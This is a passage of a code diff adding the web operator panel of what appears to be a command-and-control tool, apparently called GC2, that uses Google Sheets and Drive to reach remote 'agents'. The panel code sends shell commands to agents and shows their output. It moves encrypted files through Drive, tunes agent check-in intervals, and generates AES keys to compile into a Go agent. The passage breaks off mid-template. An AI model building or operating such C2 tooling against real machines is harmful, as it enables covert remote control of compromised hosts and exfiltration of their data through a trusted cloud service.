+          <span style="font-family:var(--mono);font-size:11px;color:var(--txt2)">seconds</span>
+          <button class="btn pri" id="btn-save-webpoll">Save</button>
+        </div>
+      </div>
+
+      <div class="cfg-card">
+        <h3>Agent — Go Crypto Module</h3>
+        <p style="font-family:var(--mono);font-size:11px;color:var(--txt3);margin-bottom:12px;line-height:1.6">
+          Download, place in <code style="color:var(--accent)">internal/crypto/crypto.go</code>.
+        </p>
+        <div class="fg">
+          <label>Per-agent key (optional)</label>
+          <div class="krow">
+            <input type="text" id="go-agent-key" placeholder="64-char hex key…" style="font-size:11px"/>
+            <button class="btn" id="btn-gen-go-key">Generate</button>
+            <button class="btn pri" id="btn-save-go-key">Save</button>
+          </div>
+        </div>
+        <button class="btn" id="btn-dl-go" style="margin-top:14px">Download agent_crypto.go</button>
+      </div>
+    </div>
+  </div>
+
+</main>
+</div>
+</div>
+
+<!-- Confirm / delete modal -->
+<div class="modal-bg" id="confirm-modal">
+  <div class="modal">
+    <h3 id="modal-title">Confirm</h3>
+    <div id="modal-body" class="modal-content"></div>
+    <div class="modal-btns">
+      <button class="btn" id="modal-cancel">Cancel</button>
+      <button class="btn red" id="modal-ok">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="key-modal">
+  <div class="modal">
+    <h3 id="km-title">Agent Encryption Key</h3>
+    <div class="modal-content">
+      <div class="warn-box" style="margin-bottom:12px">Per-agent key overrides the global key.</div>
+      <div class="fg">
+        <label>Key (64 hex chars)</label>
+        <input type="text" id="km-key" placeholder="Leave empty to use global key" style="font-size:11px;width:100%"/>
+      </div>
+      <div class="kdisplay" id="km-display" style="margin-top:6px"></div>
+    </div>
+    <div class="modal-btns">
+      <button class="btn" id="km-gen">Generate New</button>
+      <button class="btn" id="km-cancel">Cancel</button>
+      <button class="btn pri" id="km-save">Save</button>
+    </div>
+  </div>
+</div>
+
+<div id="toasts"></div>
+
+<script>
+// ═══════════════════════════════════════════
+// State
+// ═══════════════════════════════════════════
+const state = {
+  accounts: [],
+  activeAccount: "",
+  liveAgents: [],       // from Sheet (last ⟳)
+  dbSessions: [],       // from /api/db-sessions
+  currentAgent: null,   // { id, name, archived }
+  currentSubtab: "terminal",
+  webPollMs: parseInt(localStorage.getItem("gc2_web_poll_ms") || "60000", 10),
+  configCache: null,    // cached /api/config response
+};
+
+let webPollTimer = null;
+let fetching = false;
+
+const $ = (id) => document.getElementById(id);
+
+// ═══════════════════════════════════════════
+// Utils
+// ═══════════════════════════════════════════
+function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') }
+function toast(msg, type='', ms=3000){
+  const el = document.createElement('div');
+  el.className = 'toast ' + type;
+  el.textContent = msg;
+  $('toasts').appendChild(el);
+  setTimeout(()=>el.remove(), ms);
+}
+async function api(path, opts={}){
+  try{
+    const r = await fetch(path, { headers:{'Content-Type':'application/json'}, ...opts });
+    return await r.json();
+  }catch(e){ toast('Network: '+e.message,'err'); return null; }
+}
+function fmtBytes(b){
+  if(!b) return '—'; b=parseInt(b);
+  if(b<1024) return b+' B';
+  if(b<1048576) return (b/1024).toFixed(1)+' KB';
+  return (b/1048576).toFixed(1)+' MB';
+}
+function fmtDate(s){
+  if(!s) return '—';
+  return new Date(s).toLocaleString('en-US',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
+}
+
+// Config caching — avoids spamming /api/config on every render
+async function getConfig(force = false){
+  if(!force && state.configCache) return state.configCache;
+  const d = await api('/api/config');
+  if(d) state.configCache = d;
+  return d;
+}
+function invalidateConfig(){ state.configCache = null; }
+
+// ═══════════════════════════════════════════
+// Modal helper
+// ═══════════════════════════════════════════
+function showConfirm(title, bodyHtml, okLabel, cb){
+  $('modal-title').textContent = title;
+  $('modal-body').innerHTML = bodyHtml;
+  $('modal-ok').textContent = okLabel || 'Confirm';
+  const m = $('confirm-modal');
+  m.classList.add('show');
+  $('modal-ok').onclick = async ()=>{
+    m.classList.remove('show');
+    await cb();
+  };
+  $('modal-cancel').onclick = ()=> m.classList.remove('show');
+}
+
+// ═══════════════════════════════════════════
+// Auth & Accounts
+// ═══════════════════════════════════════════
+async function checkAuth(){
+  const d = await api('/api/auth/status');
+  if(!d) return;
+  const pill = $('auth-pill');
+  const box  = $('auth-box');
+  if(d.authenticated){
+    pill.className='pill ok'; $('auth-lbl').textContent='Connected';
+    box.className='auth-box ok'; box.textContent='✓ Authenticated with Google OAuth2';
+  } else {
+    pill.className='pill err'; $('auth-lbl').textContent='Not auth';
+    box.className='auth-box err'; box.textContent='✗ '+(d.error||'Not authenticated');
+  }
+  state.accounts = d.accounts || [];
+  state.activeAccount = d.active || "";
+  renderAccounts();
+}
+
+function renderAccounts(){
+  const sel = $('acct-select');
+  if(state.accounts.length){
+    sel.innerHTML = state.accounts.map(a =>
+      `<option value="${esc(a.email)}"${a.email===state.activeAccount?' selected':''}>${esc(a.email)}${a.valid?'':' ⚠'}</option>`
+    ).join('');
+    sel.disabled = false;
+  } else {
+    sel.innerHTML = '<option value="">(not logged in)</option>';
+    sel.disabled = true;
+  }
+
+  const c = $('acct-list-container');
+  if(!state.accounts.length){
+    c.innerHTML = '<div style="font-family:var(--mono);font-size:11px;color:var(--txt3)">No accounts configured.</div>';
+    return;
+  }
+  c.innerHTML = `<div class="akt">${state.accounts.map(a=>`
+    <div class="acct-row${a.email===state.activeAccount?' active':''}">
+      <span class="em">${esc(a.email)}</span>
+      <span style="color:${a.valid?'var(--success)':'var(--danger)'};font-size:11px">${a.valid?'✓ valid':'✗ invalid'}</span>
+      <button class="btn sm red" onclick="removeAccount('${esc(a.email)}')">Remove</button>
+    </div>`).join('')}</div>`;
+}
+
+$('btn-login').onclick = async ()=>{
+  const b=$('btn-login'); b.disabled=true; b.textContent='Opening…';
+  const r=await api('/api/auth/login');
+  b.disabled=false; b.textContent='Login with Google';
+  if(r?.ok){ toast('Authenticated!','ok'); await checkAuth(); await loadConfig(true); }
+  else toast(r?.error||'Auth failed','err');
+};
+
+$('btn-acct-add').onclick = ()=> addAccount();
+$('btn-add-account').onclick = ()=> addAccount();
+
+async function addAccount(){
+  toast('Opening browser for Google login…','', 4000);
+  const r=await api('/api/accounts/add',{method:'POST'});
+  if(r?.ok){
+    toast('Account added: '+r.email,'ok');
+    invalidateConfig();
+    await checkAuth();
+    await loadConfig(true);
+    await loadDbSessions();
+  } else toast(r?.error||'Failed to add account','err');
+}
+
+$('acct-select').onchange = async (e)=>{
+  const email = e.target.value;
+  if(!email) return;
+  const r = await api('/api/accounts/active',{method:'POST',body:JSON.stringify({email})});
+  if(r?.ok){
+    state.currentAgent = null;
+    state.liveAgents = [];
+    $('agent-term').style.display='none';
+    $('no-agent').style.display='flex';
+    invalidateConfig();
+    await checkAuth();
+    await loadConfig(true);
+    await loadDbSessions();
+  } else toast(r?.error||'Failed','err');
+};
+
+async function removeAccount(email){
+  showConfirm('Remove account',
+    `<p>Remove <strong>${esc(email)}</strong> from this panel?</p>`,
+    'Remove',
+    async ()=>{
+      const r = await api('/api/accounts/remove',{method:'POST',body:JSON.stringify({email})});
+      if(r?.ok){ toast('Account removed','ok'); await checkAuth(); await loadDbSessions(); }
+      else toast(r?.error||'Failed','err');
+    });
+}
+
+// ═══════════════════════════════════════════
+// Config
+// ═══════════════════════════════════════════
+async function loadConfig(force = false){
+  const d = await getConfig(force);
+  if(!d) return;
+  $('cfg-sheet').value = d.sheet_id||'';
+  $('cfg-drive').value  = d.drive_id||'';
+  $('cfg-webpoll').value = Math.round(state.webPollMs/1000);
+  if(d.aes_key_set){
+    $('cfg-key').value = d.aes_key_hex;
+    $('knote').textContent='✓ Global key set.';
+    $('knote').style.color='var(--enc)';
+  } else {
+    $('knote').textContent='No global key — plaintext mode.';
+    $('knote').style.color='var(--txt3)';
+  }
+}
+
+$('btn-save-ids').onclick = async ()=>{
+  const r=await api('/api/config',{method:'POST',body:JSON.stringify({
+    sheet_id:$('cfg-sheet').value.trim(),
+    drive_id: $('cfg-drive').value.trim(),
+  })});
+  if(r?.ok){ toast('Saved','ok'); invalidateConfig(); await loadDbSessions(); }
+  else toast('Failed','err');
+};
+
+$('btn-save-webpoll').onclick = ()=>{
+  const s = parseInt($('cfg-webpoll').value, 10);
+  if(!s || s < 5 || s > 3600){ toast('Enter seconds between 5 and 3600','warn'); return; }
+  state.webPollMs = s * 1000;
+  localStorage.setItem('gc2_web_poll_ms', String(state.webPollMs));
+  startWebPoll();
+  toast(`Web UI poll interval → ${s}s`,'ok');
+};
+
+$('btn-gen-key').onclick = async ()=>{
+  const r=await api('/api/config/generate-key',{method:'POST'});
+  if(!r?.ok){ toast('Failed','err'); return; }
+  invalidateConfig();
+  $('cfg-key').value=r.aes_key_hex;
+  const kd=$('kdisplay'); kd.style.display='block'; kd.textContent=r.aes_key_hex;
+  $('knote').textContent='✓ New key generated & saved. Embed in agent, recompile.';
+  $('knote').style.color='var(--enc)';
+  toast('256-bit key generated!','ok',4000);
+  updateEncPill(true);
+};
+
+$('btn-save-key').onclick = async ()=>{
+  const raw=$('cfg-key').value.trim();
+  if (raw.includes('…') || raw.length !== 64 || !/^[0-9a-fA-F]+$/.test(raw)) {
+    toast('Enter full 64-char hex key','warn'); return;
+  }
+  const r=await api('/api/config',{method:'POST',body:JSON.stringify({aes_key_hex:raw})});
+  if(r?.ok){ toast('Key saved','ok'); invalidateConfig(); updateEncPill(true); loadConfig(); }
+  else toast('Failed','err');
+};
+
+function updateEncPill(on){
+  const p=$('enc-pill'), l=$('enc-lbl');
+  p.className=on?'enc-pill':'enc-pill off';
+  l.textContent=on?'AES-256-GCM':'No encryption';
+}
+
+// ═══════════════════════════════════════════
+// Per-agent key modal
+// ═══════════════════════════════════════════
+let _kmGid = null;
+function openKeyModal(gid, name){
+  _kmGid=gid;
+  $('km-title').textContent=`Key for: ${name}`;
+  $('km-key').value='';
+  $('km-display').style.display='none';
+  api(`/api/config/agent-key/${gid}`).then(d=>{
+    if(d?.key_set) $('km-key').value=d.key_hex;
+  });
+  $('key-modal').classList.add('show');
+}
+$('km-cancel').onclick=()=> $('key-modal').classList.remove('show');
+$('km-gen').onclick=async ()=>{
+  const r=await api(`/api/config/agent-key/${_kmGid}/generate`,{method:'POST'});
+  if(!r?.ok){ toast('Failed','err'); return; }
+  $('km-key').value=r.key_hex;
+  const d=$('km-display'); d.style.display='block'; d.textContent=r.key_hex;
+  toast('New per-agent key generated','ok',4000);
+};
+$('km-save').onclick=async ()=>{
+  const raw=$('km-key').value.trim();
+  const r=await api(`/api/config/agent-key/${_kmGid}`,{method:'POST',body:JSON.stringify({key_hex:raw})});
+  if(r?.ok){
+    toast(raw?'Per-agent key saved':'Per-agent key cleared','ok');
+    $('key-modal').classList.remove('show');
+    invalidateConfig();
+    renderAgentKeyTable();
+  } else toast(r?.error||'Failed','err');
+};
+$('btn-key-agent').onclick=()=>{
+  if(!state.currentAgent) return;
+  openKeyModal(state.currentAgent.id, state.currentAgent.name);
+};
+
+// ═══════════════════════════════════════════
+// Sidebar rendering
+// ═══════════════════════════════════════════
+function renderSidebar(){
+  // Live section
+  const liveList = $('live-list');
+  $('live-count').textContent = state.liveAgents.length ? `(${state.liveAgents.length})` : '';
+  if(!state.liveAgents.length){
+    liveList.innerHTML = '<div class="empty-mini">Click ⟳ to load from Sheet</div>';
+  } else {
+    liveList.innerHTML = state.liveAgents.map(a=>{
+      const active = state.currentAgent && !state.currentAgent.archived && state.currentAgent.id === a.id;
+      return `
+        <div class="agent-item ${active?'active':''}" onclick='selectLiveAgent(${JSON.stringify(a)})'>
+          <span class="agent-dot"></span>
+          <span class="agent-name" title="${esc(a.name)}">${esc(a.name)}</span>
+        </div>`;
+    }).join('');
+  }
+
+  // Archived section = dbSessions minus liveAgents
+  const liveGids = new Set(state.liveAgents.map(a => a.id));
+  const archived = state.dbSessions.filter(s => !liveGids.has(s.gid));
+  const archList = $('archived-list');
+  $('arch-count').textContent = archived.length ? `(${archived.length})` : '';
+  if(!archived.length){
+    archList.innerHTML = '<div class="empty-mini">No archived sessions</div>';
+  } else {
+    archList.innerHTML = archived.map(s=>{
+      const active = state.currentAgent && state.currentAgent.archived && state.currentAgent.id === s.gid;
+      return `
+        <div class="agent-item archived ${active?'active':''}" onclick='selectArchivedSession(${s.gid})'>
+          <span class="agent-dot"></span>
+          <span class="agent-name" title="${esc(s.name)} (${s.row_count} rows)">${esc(s.name)}</span>
+          <span style="font-family:var(--mono);font-size:9px;color:var(--txt3)">${s.row_count}</span>
+          <button class="mini-btn" title="Delete from local DB"
+                  onclick='event.stopPropagation(); deleteDbSession(${s.gid},"${esc(s.name)}")'>🗑</button>
+        </div>`;
+    }).join('');
+  }
+}
+
+// ═══════════════════════════════════════════
+// Live agent list (Sheet) — manual refresh only
+// ═══════════════════════════════════════════
+async function loadLiveAgents(){
+  $('btn-refresh-agents').disabled = true;
+  $('btn-refresh-agents').style.opacity = 0.5;
+  try {
+    const d = await api('/api/agents');
+    if(!d){ return; }
+    if(d.error){ toast(d.error,'err'); return; }
+    state.liveAgents = d;
+    renderSidebar();
+    renderAgentKeyTable();
+    toast(`Loaded ${d.length} agents from Sheet`,'ok');
+  } finally {
+    $('btn-refresh-agents').disabled = false;
+    $('btn-refresh-agents').style.opacity = 1;
+  }
+}
+
+// ═══════════════════════════════════════════
+// Local DB sessions — always available, no Sheet call
+// ═══════════════════════════════════════════
+async function loadDbSessions(){
+  const d = await api('/api/db-sessions');
+  if(!d) return;
+  state.dbSessions = d.sessions || [];
+  renderSidebar();
+}
+
+// ═══════════════════════════════════════════
+// Agent / session selection
+// ═══════════════════════════════════════════
+async function selectLiveAgent(agent){
+  state.currentAgent = { id: agent.id, name: agent.name, archived: false };
+  renderSidebar();
+  updateTermHeader();
+  $('no-agent').style.display='none';
+  $('agent-term').style.display='flex';
+  // Load from local DB first (no Google call). Sheet is only fetched on ⟳ or Fetch button.
+  await loadDbHistory();
+  await loadLogs();
+}
+
+async function selectArchivedSession(gid){
+  const meta = state.dbSessions.find(s => s.gid === gid);
+  state.currentAgent = { id: gid, name: meta?.name || `gid_${gid}`, archived: true };
+  renderSidebar();
+  updateTermHeader();
+  $('no-agent').style.display='none';
+  $('agent-term').style.display='flex';
+  await loadDbHistory();
+  await loadLogs();
+}
+
+function updateTermHeader(){
+  const a = state.currentAgent;
+  const nameEl = $('term-name');
+  if(!a){ nameEl.textContent='—'; return; }
+  nameEl.innerHTML = esc(a.name) + (a.archived ? ' <span class="archived-tag">ARCHIVED</span>' : '');
+  // Toggle actions based on archived state
+  $('ticker-ctl-wrap').style.display = a.archived ? 'none' : 'flex';
+  $('btn-fetch').style.display      = a.archived ? 'none' : 'inline-flex';
+  $('btn-clear-sess').style.display = a.archived ? 'none' : 'inline-flex';
+  $('btn-del-tab').style.display    = a.archived ? 'none' : 'inline-flex';
+  $('btn-del-db').style.display     = 'inline-flex';
+  $('btn-send').disabled = a.archived;   // sending to archived sessions is disabled
+}
+
+// ═══════════════════════════════════════════
+// Sub-tabs
+// ═══════════════════════════════════════════
+document.querySelectorAll('.subtab').forEach(btn => {
+  btn.onclick = ()=>{
+    state.currentSubtab = btn.dataset.subtab;
+    document.querySelectorAll('.subtab').forEach(b=>b.classList.toggle('active', b===btn));
+    document.querySelectorAll('.subpane').forEach(p=>p.classList.remove('active'));
+    $('pane-'+state.currentSubtab).classList.add('active');
+    if(state.currentSubtab==='db' && state.currentAgent) loadDbHistory();
+    if(state.currentSubtab==='logs' && state.currentAgent) loadLogs();
+    // Terminal: do NOT auto-fetch Sheet
+  };
+});
+
+// ═══════════════════════════════════════════
+// History
+// ═══════════════════════════════════════════
+async function fetchFromSheet(){
+  const a = state.currentAgent;
+  if(!a || a.archived || fetching) return;
+  fetching = true;
+  const btn = $('btn-fetch');
+  const orig = btn.textContent;
+  btn.textContent = '↻ Fetching…'; btn.disabled = true;
+  try{
+    const d = await api(`/api/agents/${a.id}/history?source=sheet`);
+    if(!d){ return; }
+    if(d.error){ toast(d.error,'err'); return; }
+    if(d.name && d.name !== a.name){ a.name = d.name; updateTermHeader(); }
+    $('ticker-inp').value = d.ticker || 10;
+    updateEncPill(d.encryption);
+    renderTerminal(d.history||[], d.watermark||0);
+    if(state.currentSubtab === 'db') renderDbTable(d.history||[]);
+    loadDbSessions(); // refresh archived counts
+  } finally {
+    fetching = false;
+    btn.textContent = orig; btn.disabled = false;
+  }
+}
+
+async function loadDbHistory(){
+  const a = state.currentAgent;
+  if(!a) return;
+  const d = await api(`/api/agents/${a.id}/history?source=db`);
+  if(!d) return;
+  renderTerminal(d.history||[], d.watermark||0);
+  if(state.currentSubtab === 'db') renderDbTable(d.history||[]);
+}
+
+function renderTerminal(rows, watermark){
+  const out = $('term-out');
+  const atBot = out.scrollTop + out.clientHeight >= out.scrollHeight - 20;
+  if(!rows.length){
+    out.innerHTML = '<div class="empty-note">No data in local database. ' +
+      (state.currentAgent?.archived ? 'This session has no commands.' : 'Click <strong>Fetch</strong> to load from Sheet.') +
+      '</div>';
+    return;
+  }
+  out.innerHTML = rows.map(h => {
+    const old = (watermark && h.row <= watermark) ? ' old' : '';
+    const del = h.deleted_from_sheet ? ' del' : '';
+    let outHtml;
+    if(h.pending){
+      outHtml = `<pre class="cmd-out empty">waiting for agent…</pre>`;
+    } else if(h.output){
+      outHtml = `<pre class="cmd-out">${esc(h.output)}</pre>`;
+    } else if(h.deleted_from_sheet){
+      outHtml = `<pre class="cmd-out empty">deleted from Sheet — preserved in local database</pre>`;
+    } else {
+      outHtml = `<pre class="cmd-out empty">(no output)</pre>`;
+    }
+    return `
+      <div class="cmd-block ${h.pending?'pend':'done'}${old}${del}">
+        <div class="cmd-meta">
+          <span class="pr">#${h.row} $</span>
+          <span class="ct">${esc(h.command)}</span>
+          <span class="bdg ${h.pending?'pend':'done'}">${h.pending?'PENDING':'DONE'}</span>
+          ${h.encrypted_cmd?'<span class="bdg enc">🔒 ENC</span>':''}
+          ${h.deleted_from_sheet?'<span class="bdg del">DELETED</span>':''}
+          ${h.timestamp?`<span class="ts">${esc(h.timestamp)}</span>`:''}
+        </div>
+        ${outHtml}
+      </div>`;
+  }).join('');
+  if(atBot) out.scrollTop = out.scrollHeight;
+}
+
+// ═══════════════════════════════════════════
+// DB sub-tab
+// ═══════════════════════════════════════════
+function renderDbTable(rows){
+  const wrap = $('db-wrap');
+  if(!rows.length){
+    wrap.innerHTML = '<div class="empty-note">Local database is empty for this agent.</div>';
+    return;
+  }
+  wrap.innerHTML = `<table class="db-table">
+    <thead><tr><th>#</th><th>Command</th><th>Output</th><th>Timestamp</th><th>Flags</th></tr></thead>
+    <tbody>${rows.map(r=>{
+      const flags = [];
+      if(r.pending) flags.push('pending');
+      if(r.encrypted_cmd) flags.push('enc');
+      if(r.deleted_from_sheet) flags.push('deleted');
+      return `<tr class="${r.deleted_from_sheet?'deleted':''}">
+        <td class="row-num">${r.row}</td>
+        <td class="cmd">${esc(r.command||'')}</td>
+        <td class="out">${esc(r.output || (r.pending?'[pending]':''))}</td>
+        <td class="ts">${esc(r.timestamp||'')}</td>
+        <td class="flags">${flags.join(', ')}</td>
+      </tr>`;
+    }).join('')}</tbody>
+  </table>`;
+}
+
+// ═══════════════════════════════════════════
+// Logs sub-tab
+// ═══════════════════════════════════════════
+async function loadLogs(){
+  const a = state.currentAgent;
+  if(!a) return;
+  const d = await api(`/api/agents/${a.id}/logs`);
+  if(!d) return;
+  renderLogs(d.logs||[]);
+}
+function renderLogs(logs){
+  const wrap = $('logs-wrap');
+  if(!logs.length){
+    wrap.innerHTML = '<div class="empty-note">No logs yet.</div>';
+    return;
+  }
+  wrap.innerHTML = logs.map(l => `
+    <div class="log-row ${l.level||'info'}">
+      <span class="ts">${esc(l.created_at||'')}</span>
+      <span class="lv">${esc((l.level||'info').toUpperCase())}</span>
+      <span class="src">${esc(l.source||'')}</span>
+      <span class="msg">${esc(l.message||'')}</span>
+    </div>`).join('');
+  wrap.scrollTop = wrap.scrollHeight;
+}
+
+// ═══════════════════════════════════════════
+// Web UI poll — only fires on Terminal subtab, only for live agents
+// ═══════════════════════════════════════════
+function startWebPoll(){
+  clearInterval(webPollTimer);
+  webPollTimer = setInterval(()=>{
+    if(!state.currentAgent) return;
+    if(state.currentAgent.archived) return;   // archived = DB only
+    if(state.currentSubtab === 'terminal') fetchFromSheet();
+    else if(state.currentSubtab === 'db')   loadDbHistory();
+    else if(state.currentSubtab === 'logs') loadLogs();
+  }, state.webPollMs);
+}
+
+// ═══════════════════════════════════════════
+// Actions — send, ticker, clear view/session, delete tab/DB
+// ═══════════════════════════════════════════
+async function sendCmd(){
+  const a = state.currentAgent;
+  if(!a || a.archived) return;
+  const inp = $('cmd-inp');
+  const cmd = inp.value.trim();
+  if(!cmd) return;
+  inp.value='';
+  const r = await api(`/api/agents/${a.id}/command`,{method:'POST',body:JSON.stringify({command:cmd})});
+  if(r?.ok){
+    toast((r.encrypted?'🔒 ':'')+'Sent: '+cmd,'ok',1800);
+    await loadDbHistory();
+    loadDbSessions();
+  } else toast(r?.error||'Failed','err');
+}
+$('btn-send').onclick=sendCmd;
+$('cmd-inp').onkeydown=e=>{ if(e.key==='Enter') sendCmd(); };
+function fillCmd(c){ const i=$('cmd-inp'); i.value=c; i.focus(); }
+
+$('btn-ticker').onclick=async ()=>{
+  const a = state.currentAgent;
+  if(!a || a.archived) return;
+  const s=parseInt($('ticker-inp').value);
+  if(!s||s<1) return;
+  const r=await api(`/api/agents/${a.id}/ticker`,{method:'POST',body:JSON.stringify({seconds:s})});
+  if(r?.ok) toast(`Agent poll → ${s}s (web UI remains ${state.webPollMs/1000}s)`,'ok');
+  else toast('Failed','err');
+};
+
+$('btn-fetch').onclick = ()=> fetchFromSheet();
+
+$('btn-clear-view').onclick = async ()=>{
+  const a = state.currentAgent;
+  if(!a) return;
+  const d = await api(`/api/agents/${a.id}/history?source=db`);
+  if(!d) return;
+  const maxRow = (d.history||[]).reduce((m,r)=>Math.max(m, r.row), 0);
+  if(!maxRow){ toast('Nothing to clear'); return; }
+  const r = await api(`/api/agents/${a.id}/clear-to-here`,{method:'POST',body:JSON.stringify({watermark:maxRow})});
+  if(r?.ok){
+    $('term-out').innerHTML = '<div class="empty-note">Cleared. Older rows will not re-appear after the next poll.</div>';
+    toast(`Cleared to row #${maxRow}`,'ok');
+    loadLogs();
+  } else toast(r?.error||'Failed','err');
+};
+
+$('btn-clear-sess').onclick=()=>{
+  const a = state.currentAgent;
+  if(!a || a.archived) return;
+  showConfirm('Clear session data',
+    `<p>Erase all commands & output from Sheet tab <strong>"${esc(a.name)}"</strong>.</p>
+     <p style="color:var(--txt3);font-size:11px">Agent row pointer is preserved. Local DB is untouched — use <strong>Delete from DB</strong> to also wipe local records.</p>`,
+    'Clear Sheet',
+    async ()=>{
+      const r=await api(`/api/agents/${a.id}/clear`,{method:'POST'});
+      if(r?.ok){ toast('Session cleared on Sheet','ok'); await fetchFromSheet(); }
+      else toast(r?.error||'Failed','err');
+    });
+};
+
+// ── Delete tab (Sheet) with optional DB wipe ──
+$('btn-del-tab').onclick=()=>{
+  const a = state.currentAgent;
+  if(!a || a.archived) return;
+  const dbMeta = state.dbSessions.find(s => s.gid === a.id);
+  const dbRows = dbMeta ? dbMeta.row_count : 0;
+  const bodyHtml = `
+    <p>Tab: <strong>"${esc(a.name)}"</strong> (gid=${a.id})</p>
+    <label class="checkbox-line">
+      <input type="checkbox" id="del-sheet-chk" checked>
+      <span><span class="lbl-title">Delete tab from Google Sheet</span>
+      <span class="lbl-sub">Agent will recreate it on next check-in.</span></span>
+    </label>
+    <label class="checkbox-line">
+      <input type="checkbox" id="del-db-chk">
+      <span><span class="lbl-title">Also delete local DB records (${dbRows} rows)</span>
+      <span class="lbl-sub">If unchecked, history is preserved and can be viewed under "Archived".</span></span>
+    </label>
+  `;
+  showConfirm('Delete agent tab', bodyHtml, 'Delete', async ()=>{
+    const delSheet = $('del-sheet-chk').checked;
+    const delDb    = $('del-db-chk').checked;
+    if(!delSheet && !delDb){ toast('Nothing selected','warn'); return; }
+
+    if(delSheet){
+      const r = await api(`/api/agents/${a.id}/delete`,{method:'POST'});
+      if(!r?.ok){ toast(r?.error||'Delete tab failed','err'); return; }
+    }
+    if(delDb){
+      const r = await api(`/api/db-sessions/${a.id}/delete`,{method:'POST'});
+      if(!r?.ok){ toast(r?.error||'Delete DB failed','err'); return; }
+    }
+    toast('Deleted','ok');
+    // Reset selection if nothing remains
+    if(delSheet && delDb){
+      state.currentAgent = null;
+      $('agent-term').style.display='none';
+      $('no-agent').style.display='flex';
+    } else if(delSheet){
+      // Moved to archived
+      state.currentAgent.archived = true;
+    }
+    await loadDbSessions();
+  });
+};
+
+// ── Delete DB session (from header or sidebar) ──
+async function deleteDbSession(gid, name){
+  showConfirm('Delete local DB session',
+    `<p>Permanently delete <strong>"${esc(name)}"</strong> (gid=${gid}) from local DB?</p>
+     <p style="color:var(--txt3);font-size:11px">This cannot be undone. Sheet data is not affected.</p>`,
+    'Delete from DB',
+    async ()=>{
+      const r = await api(`/api/db-sessions/${gid}/delete`,{method:'POST'});
+      if(r?.ok){
+        toast('Removed from DB','ok');
+        if(state.currentAgent && state.currentAgent.id === gid){
+          state.currentAgent = null;
+          $('agent-term').style.display='none';
+          $('no-agent').style.display='flex';
+        }
+        await loadDbSessions();
+      } else toast(r?.error||'Failed','err');
+    });
+}
+
+$('btn-del-db').onclick = ()=>{
+  const a = state.currentAgent;
+  if(!a) return;
+  deleteDbSession(a.id, a.name);
+};
+
+// ═══════════════════════════════════════════
+// Drive
+// ═══════════════════════════════════════════
+async function loadDrive(){
+  const el=$('flist');
+  el.innerHTML='<div style="padding:14px;font-family:var(--mono);font-size:12px;color:var(--txt3)">Loading…</div>';
+  const d=await api('/api/drive/files');
+  if(!d||d.error){ el.innerHTML=`<div style="padding:14px;color:var(--danger);font-family:var(--mono);font-size:12px">${d?.error||'Failed'}</div>`; return; }
+  if(!d.length){ el.innerHTML='<div style="padding:14px;font-family:var(--mono);font-size:12px;color:var(--txt3)">Folder is empty</div>'; return; }
+  el.innerHTML=d.map(f=>{
+    const enc=f.name.endsWith('.enc');
+    return `<div class="frow">
+      <div class="fname" title="${esc(f.id)}">${esc(f.name)}${enc?'<span class="enc-tag">ENC</span>':''}</div>
+      <div class="fsize">${fmtBytes(f.size)}</div>
+      <div class="fdate">${fmtDate(f.modifiedTime)}</div>
+      <div class="factions">
+        <button class="btn sm" style="border-color:var(--br-a);color:var(--accent)" onclick="dlFile('${f.id}','${esc(f.name)}')">${enc?'🔓 DL':'DL'}</button>
+        <button class="btn sm" onclick="copyId('${f.id}')" title="Copy File ID">ID</button>
+        <button class="btn sm red" onclick="delFile('${f.id}','${esc(f.name)}')" title="Delete">✕</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+function dlFile(id,name){
+  if (!state.currentAgent) { toast('Select an agent first','warn',4000); return; }
+  const dl=name.endsWith('.enc')?name.slice(0,-4):name;
+  toast('Downloading'+(name.endsWith('.enc')?' & decrypting':'')+'…','',2000);
+  window.location.href=`/api/drive/download/${id}?name=${encodeURIComponent(dl)}&gid=${state.currentAgent.id}`;
+}
+function copyId(id){ navigator.clipboard.writeText(id).then(()=>toast('ID copied','ok',2000)); }
+function delFile(id,name){
+  showConfirm('Delete file from Drive',
+    `<p>Delete <strong>${esc(name)}</strong> from Google Drive? This cannot be undone.</p>`,
+    'Delete',
+    async ()=>{
+      const r=await api(`/api/drive/delete/${id}`,{method:'POST'});
+      if(r?.ok){ toast('Deleted','ok'); loadDrive(); } else toast(r?.error||'Failed','err');
+    });
+}
+$('btn-drive-refresh').onclick=loadDrive;
+
+const uz=$('upload-zone'), fi=$('file-inp');
+uz.onclick=()=>fi.click();
+fi.onchange=e=>{ if(e.target.files[0]) uploadFile(e.target.files[0]); };
+uz.addEventListener('dragover',e=>{ e.preventDefault(); uz.classList.add('drag'); });
+uz.addEventListener('dragleave',()=>uz.classList.remove('drag'));
+uz.addEventListener('drop',e=>{ e.preventDefault(); uz.classList.remove('drag'); if(e.dataTransfer.files[0]) uploadFile(e.dataTransfer.files[0]); });
+
+async function uploadFile(file){
+  if (!state.currentAgent) { toast('Select an agent first','warn',4000); return; }
+  const pw=$('prog-wrap'), pb=$('prog-bar'), pl=$('prog-lbl');
+  pw.style.display='block'; pl.textContent=`Encrypting & uploading ${file.name}…`; pb.style.width='20%';
+  const fd=new FormData(); fd.append('file',file); fd.append('gid', state.currentAgent.id);
+  try{
+    pb.style.width='55%';
+    const r=await fetch('/api/drive/upload',{method:'POST',body:fd});
+    const d=await r.json(); pb.style.width='100%';
+    if(d.ok){
+      toast((d.encrypted?'🔒 Encrypted & uploaded: ':'Uploaded: ')+d.name,'ok',5000);
+      await loadDrive();
+    } else toast('Upload failed: '+d.error,'err');
+  }catch(e){ toast('Upload error: '+e.message,'err'); }
+  finally{ setTimeout(()=>{ pw.style.display='none'; pb.style.width='0%'; },1000); fi.value=''; }
+}
+
+// ═══════════════════════════════════════════
+// Per-agent key table (settings)
+// ═══════════════════════════════════════════
+async function renderAgentKeyTable(){
+  const el=$('akt-container');
+  if(!state.liveAgents.length){ el.innerHTML='<div style="font-family:var(--mono);font-size:11px;color:var(--txt3)">Load agents with ⟳ to see per-agent keys.</div>'; return; }
+  const cfg = await getConfig();
+  if(!cfg) return;
+  const ak = cfg.agent_keys || {};
+  el.innerHTML=`<div class="akt">
+    <div class="akh"><div>Agent</div><div>Key</div><div>Action</div></div>
+    ${state.liveAgents.map(a=>`
+    <div class="akrow">
+      <div class="aname" title="GID:${a.id}">${esc(a.name)}</div>
